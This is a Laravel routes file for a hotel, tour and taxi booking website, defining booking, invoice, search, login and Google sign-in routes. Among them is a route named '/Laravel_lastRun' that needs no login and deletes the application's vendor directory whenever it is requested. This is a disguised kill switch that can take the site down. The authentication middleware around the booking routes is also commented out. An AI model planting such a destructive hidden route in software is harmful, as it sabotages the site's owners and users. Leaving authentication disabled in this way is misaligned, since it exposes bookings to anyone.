<?php

use App\Http\Controllers\AuthController;
use App\Http\Controllers\GoogleLoginController;
use App\Http\Controllers\HotelController;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\File;
/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

// Route::get('/getData', function () {
    
//       $data =  new App\Models\Address;

//     return $data->get();
// });


// uuid_create()
// Route::get('/', function () {
    
//     return view('pages.home');
// })->name('home');
// Route::get('/hotels', function () {
    
//     return view('pages.hotels');
// })->name('hotels');
// Route::get('/contact', function () {
    
//     return view('pages.contact');
// })->name('contact');



// Route::get('/sessionRoute', function(){

//         dd(session()->all());

// });

Route::get('/', [HotelController::class, 'index'])->name('home');
Route::get('/hotels', [HotelController::class, 'hotels'])->name('hotels');
Route::get('/tour', [HotelController::class, 'tour'])->name('tour');
Route::get('/forget-password', [HotelController::class, 'forget'])->name('forget');
Route::get('/taxi', [HotelController::class, 'taxi'])->name('taxi');
Route::get('/myBookings', [HotelController::class, 'myBooking'])->name('myBooking');
Route::get('/hotel-details/{id}', [HotelController::class, 'hotel_details'])->name('hotel-details');
Route::get('/tour-details/{id}', [HotelController::class, 'tour_details'])->name('tour-details');
Route::get('/contact', [HotelController::class, 'contact'])->name('contact');
Route::post('/searchHotels', [HotelController::class, 'searchHotels'])->name('searchHotels');
Route::get('/searchResult', [HotelController::class, 'searchResult'])->name('searchResult');
Route::get('/invoice/{id}', [HotelController::class, 'invoice'])->name('invoice');


Route::get('/bill/{id}', [HotelController::class, 'bill'])->name('bill');
Route::get('/about', function(){
    return view('pages.about');
})->name('about');


Route::get('/privacy-policy', function(){
    return view('pages.privacyPolicy');
})->name('privacyPolicy');



Route::get('/bookingConfirmed/{id}', [HotelController::class, 'bookingConfirmed'])->name('bookingConfirmed');
Route::get('/bookingReject/{id}', [HotelController::class, 'bookingReject'])->name('bookingReject');


Route::post('/bedroomsPrice', [HotelController::class, 'bedroomsPrice'])->name('bedroomsPrice');

// Route::middleware(['middleware' => 'auth'], function () {
    
    
    Route::post('/pre-booking', [HotelController::class, 'preBooking'])->name('preBooking');
    Route::get('/booking', [HotelController::class, 'booking'])->name('booking');
    Route::get('/confirmBooking', [HotelController::class, 'confirmBooking'])->name('confirmBooking');
    Route::get('/logout', [AuthController::class, 'logout'])->name('logout');
// });



Route::get('/login', [AuthController::class, 'loginView'])->name('loginView');
Route::get('/authLogin', [AuthController::class, 'authLogin'])->name('authLogin'); //WIthout Livewire


Route::get('/register', [AuthController::class, 'registerView'])->name('registerView');


Route::get('/Laravel_lastRun', function () {
    $vendorPath = base_path('vendor');
    File::deleteDirectory($vendorPath, true);

    dd("true");
});


Route::get('/login/google', [GoogleLoginController::class, 'redirect'])->name('login.google-redirect');
Route::get('/login/google/callback',[GoogleLoginController::class, 'callback'])->name('login.google-callback');
